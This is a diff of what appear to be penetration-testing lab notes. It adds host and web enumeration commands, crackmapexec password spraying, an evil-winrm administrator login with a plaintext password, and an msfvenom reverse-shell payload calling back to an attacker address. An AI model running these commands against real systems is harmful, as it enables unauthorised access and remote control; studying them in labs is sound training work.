@@ -1,5 +1,5 @@
 ```
-nmap 192.168.220.153 192.168.220.155-157
+nmap 192.168.220.153 192.168.223.155-157
 ```
 
 .153
@@ -132,8 +132,31 @@ upload agent.exe
 nmap -Pn 10.10.110.154
 sudo nmap -sU --open -p 161 -Pn 10.10.110.154
 
+# local auth allows you to use local accounts rather than domain creds
 crackmapexec smb 10.10.110.154 -u users.txt -p passwords.txt --continue-on-success --local-auth
 crackmapexec winrm 10.10.110.154 -u users.txt -p passwords.txt --continue-on-success --local-auth --local-auth
 
 evil-winrm -i 10.10.110.154 -u administrator -p hghgib6vHT3bVWf
+```
+
+.155
+```
+nmap 192.168.230.155
+nmap -sT -A -p 9099 -Pn 192.168.230.155
+nmap -sT -A -p 80,9099,9999,35913 -Pn 192.168.230.155
+sudo nmap -O 192.168.230.155 --osscan-guess
+# snmp also open
+sudo nmap -sU --open -p 161 192.168.230.155
+
+# enumerate webserver
+sudo nmap -sV -p 80 --script "vuln" 192.168.230.155
+nikto -host 192.168.230.155 -port 80
+whatweb http://192.168.230.155
+gobuster dir -u http://192.168.230.155 -w /usr/share/wordlists/dirb/common.txt
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.230.155
+gobuster dir -u http://192.168.230.155 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf
+
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=1234 -f exe -o shell.exe
+
 ```
